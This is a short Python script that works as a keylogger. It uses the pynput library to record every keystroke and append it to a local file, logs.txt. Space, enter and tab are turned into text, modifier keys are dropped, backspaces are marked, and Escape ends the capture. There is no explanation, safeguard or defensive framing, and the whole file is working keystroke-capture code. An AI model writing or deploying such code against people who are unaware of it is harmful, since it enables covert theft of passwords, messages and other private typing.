from pynput.keyboard import Listener, Key

def writetofile(key):
    try:
       
        letter = str(key).replace("'", "")

      
        if key == Key.space:
            letter = ' '
        elif key == Key.enter:
            letter = '\n'
        elif key in (Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.alt, Key.alt_l, Key.alt_r):
            letter = ''  
        elif key == Key.tab:
            letter = '    '  
        elif key == Key.backspace:
            letter = '[BACKSPACE]'  
        elif key == Key.esc:
            return False  

        
        with open("logs.txt", 'a') as f:
            f.write(letter)

    except Exception as e:
        print(f"Error: {e}")  


with Listener(on_press=writetofile) as listener:
    listener.join()
